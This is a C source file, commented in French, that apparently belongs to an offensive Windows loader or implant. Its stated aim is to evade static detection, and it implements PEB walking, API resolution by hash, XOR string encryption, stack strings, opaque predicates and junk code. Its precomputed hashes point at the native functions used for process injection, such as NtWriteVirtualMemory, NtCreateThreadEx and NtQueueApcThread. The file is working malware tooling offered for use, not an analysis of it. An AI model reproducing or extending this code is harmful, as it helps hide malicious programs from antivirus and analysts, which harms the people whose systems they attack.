/*
 * obfuscation.c - Techniques d'obfuscation pour éviter la détection statique
 *
 * Implémente:
 * - String encryption/decryption at runtime
 * - API hashing dynamique avec plusieurs algorithmes
 * - XOR encoding
 * - Stack strings (construction dynamique)
 *
 * Ces techniques empêchent l'analyse statique des strings et imports
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* =========================================================================
 * Algorithmes de hashing pour API resolution
 * ========================================================================= */

/*
 * Hash DJB2 - rapide et bonne distribution
 */
DWORD Hash_DJB2(const char* str) {
    DWORD hash = 5381;
    int c;
    
    while ((c = *str++)) {
        hash = ((hash << 5) + hash) + c;
    }
    
    return hash;
}

/*
 * Hash DJB2 case-insensitive
 */
DWORD Hash_DJB2_CI(const char* str) {
    DWORD hash = 5381;
    int c;
    
    while ((c = *str++)) {
        if (c >= 'A' && c <= 'Z') {
            c += 32;
        }
        hash = ((hash << 5) + hash) + c;
    }
    
    return hash;
}

/*
 * Hash SDBM - alternative à DJB2
 */
DWORD Hash_SDBM(const char* str) {
    DWORD hash = 0;
    int c;
    
    while ((c = *str++)) {
        hash = c + (hash << 6) + (hash << 16) - hash;
    }
    
    return hash;
}

/*
 * Hash FNV-1a - excellente distribution
 * Recommandé pour éviter les collisions
 */
DWORD Hash_FNV1a(const char* str) {
    DWORD hash = 2166136261u;
    
    while (*str) {
        hash ^= (BYTE)*str++;
        hash *= 16777619u;
    }
    
    return hash;
}

/*
 * Hash ROT13 + XOR - simple obfuscation
 */
DWORD Hash_ROT13_XOR(const char* str, DWORD key) {
    DWORD hash = 0;
    
    while (*str) {
        char c = *str++;
        /* ROT13 */
        if ((c >= 'A' && c <= 'M') || (c >= 'a' && c <= 'm')) {
            c += 13;
        } else if ((c >= 'N' && c <= 'Z') || (c >= 'n' && c <= 'z')) {
            c -= 13;
        }
        hash = (hash << 5) ^ (hash >> 27) ^ c;
    }
    
    return hash ^ key;
}

/*
 * Hash custom avec seed - utilisé pour éviter les signatures statiques
 */
DWORD Hash_Custom(const char* str, DWORD seed) {
    DWORD hash = seed;
    
    while (*str) {
        hash ^= (BYTE)*str++;
        hash = (hash << 13) | (hash >> 19);
        hash *= 0x5bd1e995;
        hash ^= hash >> 15;
    }
    
    return hash;
}

/* =========================================================================
 * API Resolution par hash
 * ========================================================================= */

/* Cache pour les modules résolus */
static struct {
    DWORD hash;
    HMODULE handle;
} g_module_cache[32] = {0};
static int g_module_cache_count = 0;

/* Cache pour les fonctions résolues */
static struct {
    DWORD hash;
    FARPROC addr;
} g_func_cache[128] = {0};
static int g_func_cache_count = 0;

/*
 * Résout un module par son hash (avec cache)
 */
HMODULE API_GetModuleByHash(DWORD moduleHash) {
    /* Cherche dans le cache */
    for (int i = 0; i < g_module_cache_count; i++) {
        if (g_module_cache[i].hash == moduleHash) {
            return g_module_cache[i].handle;
        }
    }
    
    /* Parcourt le PEB */
#ifdef _WIN64
    PPEB peb = (PPEB)__readgsqword(0x60);
#else
    PPEB peb = (PPEB)__readfsdword(0x30);
#endif
    
    if (!peb || !peb->Ldr) return NULL;
    
    PLIST_ENTRY head = &peb->Ldr->InMemoryOrderModuleList;
    PLIST_ENTRY entry = head->Flink;
    
    while (entry != head) {
        PLDR_DATA_TABLE_ENTRY mod = CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        
        if (mod->BaseDllName.Buffer) {
            /* Calcule le hash du nom */
            DWORD hash = 5381;
            for (USHORT i = 0; i < mod->BaseDllName.Length / sizeof(WCHAR); i++) {
                WCHAR c = mod->BaseDllName.Buffer[i];
                if (c >= L'A' && c <= L'Z') c += 32;
                hash = ((hash << 5) + hash) + c;
            }
            
            if (hash == moduleHash) {
                /* Ajoute au cache */
                if (g_module_cache_count < 32) {
                    g_module_cache[g_module_cache_count].hash = moduleHash;
                    g_module_cache[g_module_cache_count].handle = (HMODULE)mod->DllBase;
                    g_module_cache_count++;
                }
                return (HMODULE)mod->DllBase;
            }
        }
        
        entry = entry->Flink;
    }
    
    return NULL;
}

/*
 * Résout une fonction par son hash dans un module
 */
FARPROC API_GetProcByHash(HMODULE module, DWORD funcHash) {
    if (!module) return NULL;
    
    /* Cherche dans le cache (combinaison module + func) */
    DWORD cacheKey = (DWORD)(ULONG_PTR)module ^ funcHash;
    for (int i = 0; i < g_func_cache_count; i++) {
        if (g_func_cache[i].hash == cacheKey) {
            return g_func_cache[i].addr;
        }
    }
    
    /* Parse l'export directory */
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)module;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;
    
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((PBYTE)module + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) return NULL;
    
    PIMAGE_EXPORT_DIRECTORY exports = (PIMAGE_EXPORT_DIRECTORY)(
        (PBYTE)module + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress
    );
    
    if (!exports->NumberOfNames) return NULL;
    
    PDWORD names = (PDWORD)((PBYTE)module + exports->AddressOfNames);
    PWORD ordinals = (PWORD)((PBYTE)module + exports->AddressOfNameOrdinals);
    PDWORD functions = (PDWORD)((PBYTE)module + exports->AddressOfFunctions);
    
    for (DWORD i = 0; i < exports->NumberOfNames; i++) {
        char* name = (char*)((PBYTE)module + names[i]);
        
        /* Calcule le hash du nom de fonction */
        DWORD hash = Hash_DJB2(name);
        
        if (hash == funcHash) {
            FARPROC addr = (FARPROC)((PBYTE)module + functions[ordinals[i]]);
            
            /* Ajoute au cache */
            if (g_func_cache_count < 128) {
                g_func_cache[g_func_cache_count].hash = cacheKey;
                g_func_cache[g_func_cache_count].addr = addr;
                g_func_cache_count++;
            }
            
            return addr;
        }
    }
    
    return NULL;
}

/*
 * Résout une API par hash de module + hash de fonction
 */
FARPROC API_Resolve(DWORD moduleHash, DWORD funcHash) {
    HMODULE mod = API_GetModuleByHash(moduleHash);
    if (!mod) return NULL;
    return API_GetProcByHash(mod, funcHash);
}

/* =========================================================================
 * String Encryption/Decryption
 * ========================================================================= */

/*
 * Déchiffre une string XOR in-place
 */
void String_XOR_Decrypt(char* str, DWORD len, BYTE key) {
    for (DWORD i = 0; i < len; i++) {
        str[i] ^= key;
    }
}

/*
 * Déchiffre une string avec clé multi-byte
 */
void String_XOR_DecryptKey(char* str, DWORD len, const BYTE* key, DWORD keyLen) {
    for (DWORD i = 0; i < len; i++) {
        str[i] ^= key[i % keyLen];
    }
}

/*
 * Déchiffre une string avec rolling XOR
 */
void String_RollingXOR_Decrypt(char* str, DWORD len, BYTE initialKey) {
    BYTE key = initialKey;
    for (DWORD i = 0; i < len; i++) {
        char orig = str[i] ^ key;
        key = str[i];
        str[i] = orig;
    }
}

/*
 * Structure pour les strings chiffrées
 */
typedef struct _ENCRYPTED_STRING {
    DWORD length;
    BYTE key;
    char data[1];
} ENCRYPTED_STRING, *PENCRYPTED_STRING;

/*
 * Déchiffre une ENCRYPTED_STRING et retourne une copie
 * L'appelant doit free() le résultat
 */
char* String_Decrypt(PENCRYPTED_STRING encStr) {
    if (!encStr) return NULL;
    
    char* result = (char*)malloc(encStr->length + 1);
    if (!result) return NULL;
    
    memcpy(result, encStr->data, encStr->length);
    String_XOR_Decrypt(result, encStr->length, encStr->key);
    result[encStr->length] = '\0';
    
    return result;
}

/*
 * Déchiffre une string en place sur la stack
 * Retourne un pointeur vers le buffer (qui doit être alloué par l'appelant)
 */
char* String_DecryptToStack(const BYTE* encrypted, DWORD len, BYTE key, char* buffer) {
    if (!encrypted || !buffer) return NULL;
    
    for (DWORD i = 0; i < len; i++) {
        buffer[i] = encrypted[i] ^ key;
    }
    buffer[len] = '\0';
    
    return buffer;
}

/* =========================================================================
 * Stack Strings - Construction dynamique pour éviter les strings statiques
 * ========================================================================= */

/*
 * Macro helper pour construire une string sur la stack
 * Évite d'avoir la string en clair dans le binaire
 */
#define STACK_STRING_2(name, c1, c2) \
    char name[3]; name[0]=c1; name[1]=c2; name[2]=0;

#define STACK_STRING_4(name, c1, c2, c3, c4) \
    char name[5]; name[0]=c1; name[1]=c2; name[2]=c3; name[3]=c4; name[4]=0;

#define STACK_STRING_8(name, c1, c2, c3, c4, c5, c6, c7, c8) \
    char name[9]; name[0]=c1; name[1]=c2; name[2]=c3; name[3]=c4; \
    name[4]=c5; name[5]=c6; name[6]=c7; name[7]=c8; name[8]=0;

/*
 * Construit "ntdll.dll" sur la stack
 */
void GetNtdllString(char* buffer) {
    buffer[0] = 'n';
    buffer[1] = 't';
    buffer[2] = 'd';
    buffer[3] = 'l';
    buffer[4] = 'l';
    buffer[5] = '.';
    buffer[6] = 'd';
    buffer[7] = 'l';
    buffer[8] = 'l';
    buffer[9] = '\0';
}

/*
 * Construit "kernel32.dll" sur la stack
 */
void GetKernel32String(char* buffer) {
    buffer[0] = 'k';
    buffer[1] = 'e';
    buffer[2] = 'r';
    buffer[3] = 'n';
    buffer[4] = 'e';
    buffer[5] = 'l';
    buffer[6] = '3';
    buffer[7] = '2';
    buffer[8] = '.';
    buffer[9] = 'd';
    buffer[10] = 'l';
    buffer[11] = 'l';
    buffer[12] = '\0';
}

/*
 * Construit "VirtualAlloc" sur la stack
 */
void GetVirtualAllocString(char* buffer) {
    buffer[0] = 'V';
    buffer[1] = 'i';
    buffer[2] = 'r';
    buffer[3] = 't';
    buffer[4] = 'u';
    buffer[5] = 'a';
    buffer[6] = 'l';
    buffer[7] = 'A';
    buffer[8] = 'l';
    buffer[9] = 'l';
    buffer[10] = 'o';
    buffer[11] = 'c';
    buffer[12] = '\0';
}

/* =========================================================================
 * Compile-time String Encryption (pour usage avec macros)
 * ========================================================================= */

/*
 * Génère une clé pseudo-aléatoire basée sur __TIME__
 * Utilisé pour la compilation
 */
#define COMPILE_TIME_KEY() ((BYTE)(__TIME__[0] ^ __TIME__[1] ^ __TIME__[3] ^ __TIME__[4] ^ __TIME__[6] ^ __TIME__[7]))

/*
 * Macro pour chiffrer un caractère au compile-time
 */
#define ENC_CHAR(c, key) ((char)((c) ^ (key)))

/*
 * Exemple d'usage:
 * static const char enc_ntdll[] = { 
 *     ENC_CHAR('n', 0x42), ENC_CHAR('t', 0x42), ... 
 * };
 */

/* =========================================================================
 * Hashes pré-calculés pour les modules et fonctions courants
 * Évite d'avoir les noms en clair dans le binaire
 * ========================================================================= */

/* Hash DJB2 de "ntdll.dll" (lowercase) */
#define HASH_NTDLL          0x6A4ABC5B

/* Hash DJB2 de "kernel32.dll" (lowercase) */
#define HASH_KERNEL32       0x6DDB9555

/* Hash DJB2 de "kernelbase.dll" (lowercase) */
#define HASH_KERNELBASE     0x5B8ACA33

/* Hash DJB2 de "user32.dll" (lowercase) */
#define HASH_USER32         0x63C84283

/* Hash DJB2 de "advapi32.dll" (lowercase) */
#define HASH_ADVAPI32       0x5EAFD6E3

/* Hash DJB2 des fonctions NT */
#define HASH_NtAllocateVirtualMemory    0xF783B8EC
#define HASH_NtProtectVirtualMemory     0x50E92888
#define HASH_NtWriteVirtualMemory       0xC3170192
#define HASH_NtReadVirtualMemory        0xA4B2E3E7
#define HASH_NtCreateThreadEx           0xAF18CFB0
#define HASH_NtQueueApcThread           0x28EB3AF9
#define HASH_NtClose                    0x50193A25

/* Hash DJB2 des fonctions Kernel32 */
#define HASH_VirtualAlloc               0x91AFCA54
#define HASH_VirtualFree                0x30633AC
#define HASH_VirtualProtect             0x7946C61B
#define HASH_LoadLibraryA               0xB7072FF1
#define HASH_GetProcAddress             0x7802F749
#define HASH_CreateThread               0x544E6104
#define HASH_WaitForSingleObject        0x601D8708

/*
 * Résout une fonction par ses hashes pré-calculés
 */
FARPROC API_ResolvePrecomputed(DWORD moduleHash, DWORD funcHash) {
    return API_Resolve(moduleHash, funcHash);
}

/* =========================================================================
 * Obfuscation du flow de contrôle
 * ========================================================================= */

/*
 * Opaque predicate - toujours vrai mais difficile à analyser statiquement
 * Utilisé pour confondre les décompilateurs et analyseurs
 */
__declspec(noinline) BOOL OpaquePredicate_True(void) {
    volatile int x = 0;
    for (volatile int i = 0; i < 100; i++) {
        x += i;
    }
    return (x == 4950); /* Somme de 0 à 99 */
}

/*
 * Opaque predicate - toujours faux
 */
__declspec(noinline) BOOL OpaquePredicate_False(void) {
    volatile int x = 1;
    volatile int y = 2;
    return ((x * x + y * y) == (x + y) * (x + y)); /* x² + y² != (x+y)² */
}

/*
 * Junk code generator - code inutile pour confondre l'analyse
 */
__declspec(noinline) void JunkCode_1(void) {
    volatile int a = 1, b = 2, c;
    c = a + b;
    a = c - b;
    b = c - a;
    c = a * b;
}

__declspec(noinline) void JunkCode_2(void) {
    volatile char buf[16];
    for (int i = 0; i < 16; i++) {
        buf[i] = (char)(i ^ 0x55);
    }
}

/* =========================================================================
 * Utilitaires
 * ========================================================================= */

/*
 * Vide les caches (pour éviter les fuites mémoire)
 */
void API_ClearCache(void) {
    memset(g_module_cache, 0, sizeof(g_module_cache));
    g_module_cache_count = 0;
    memset(g_func_cache, 0, sizeof(g_func_cache));
    g_func_cache_count = 0;
}

/*
 * Calcule le hash d'une string au runtime
 * Utile pour le debug ou les comparaisons dynamiques
 */
DWORD API_HashString(const char* str) {
    return Hash_DJB2(str);
}

/*
 * Dump les hashes calculés (pour générer les #define)
 */
BOOL API_DumpHashes(char** outJson) {
    if (!outJson) return FALSE;
    
    char* json = (char*)malloc(4096);
    if (!json) return FALSE;
    
    snprintf(json, 4096,
        "{\n"
        "  \"modules\": {\n"
        "    \"ntdll.dll\": \"0x%08X\",\n"
        "    \"kernel32.dll\": \"0x%08X\",\n"
        "    \"user32.dll\": \"0x%08X\"\n"
        "  },\n"
        "  \"functions\": {\n"
        "    \"VirtualAlloc\": \"0x%08X\",\n"
        "    \"VirtualFree\": \"0x%08X\",\n"
        "    \"LoadLibraryA\": \"0x%08X\",\n"
        "    \"GetProcAddress\": \"0x%08X\"\n"
        "  }\n"
        "}",
        Hash_DJB2_CI("ntdll.dll"),
        Hash_DJB2_CI("kernel32.dll"),
        Hash_DJB2_CI("user32.dll"),
        Hash_DJB2("VirtualAlloc"),
        Hash_DJB2("VirtualFree"),
        Hash_DJB2("LoadLibraryA"),
        Hash_DJB2("GetProcAddress")
    );
    
    *outJson = json;
    return TRUE;
}
